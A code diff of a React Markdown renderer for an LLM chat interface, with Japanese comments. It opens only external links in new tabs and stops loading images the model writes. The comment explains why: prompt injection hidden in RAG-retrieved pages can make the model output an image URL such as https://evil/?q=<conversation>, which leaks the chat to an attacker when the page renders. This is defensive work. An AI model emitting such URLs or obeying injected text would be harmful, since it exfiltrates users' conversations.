@@ -29,17 +29,42 @@ import { safeUrl } from "@/lib/safe-url";
  * という状態が必ず発生する。react-markdown は未閉じでも例外を投げない (テストで固定)。
  */
 
+/** 別タブで開くべき外部リンクか (ページ内アンカーや相対リンクは同じタブのまま)。 */
+function isExternal(href: string | undefined): boolean {
+  return /^https?:\/\//i.test(href ?? "");
+}
+
 /** 見出しは吹き出しの中なので、ページ見出しより一段小さくする。 */
 const COMPONENTS: Components = {
-  a: ({ href, children }) => (
-    <a
-      href={href}
-      target="_blank"
-      rel="noopener noreferrer"
-      className="text-primary underline underline-offset-2 hover:no-underline"
-    >
-      {children}
-    </a>
+  a: ({ href, children }) => {
+    // ページ内リンク (remark-gfm の脚注は `#user-content-fn-1` を出す) に target="_blank" を
+    // 付けると、脚注を踏むたびに新しいタブが開く。外部リンクのときだけ付ける。
+    const external = isExternal(href);
+    return (
+      <a
+        href={href}
+        {...(external ? { target: "_blank", rel: "noopener noreferrer" } : {})}
+        className="text-primary underline underline-offset-2 hover:no-underline"
+      >
+        {children}
+      </a>
+    );
+  },
+
+  /**
+   * **LLM が書いた画像は一切読み込まない。**
+   *
+   * これは LLM チャット UI の既知の攻撃。画像は**描画しただけで (クリック不要で)**
+   * ブラウザが URL を取得しにいく。RAG は外部サイト (公式サイト・ブログ) から本文を
+   * 取り込むので、そこに仕込まれたプロンプトインジェクションが
+   * `![](https://evil/?q=会話の内容)` を出力させると、**会話内容が攻撃者のサーバへ流出する**。
+   * IP/UA の漏洩やトラッキングにも使える。
+   *
+   * このアプリに LLM が書いた画像を表示する正当な理由は無い
+   * (カード画像は自前 DB から別経路で出している)。alt テキストだけ残して情報は捨てない。
+   */
+  img: ({ alt }) => (
+    <span className="text-text-muted italic">{alt ? `[画像: ${alt}]` : "[画像]"}</span>
   ),
   p: ({ children }) => <p className="mb-2 last:mb-0 leading-relaxed">{children}</p>,
   ul: ({ children }) => <ul className="mb-2 list-disc space-y-1 pl-5 last:mb-0">{children}</ul>,
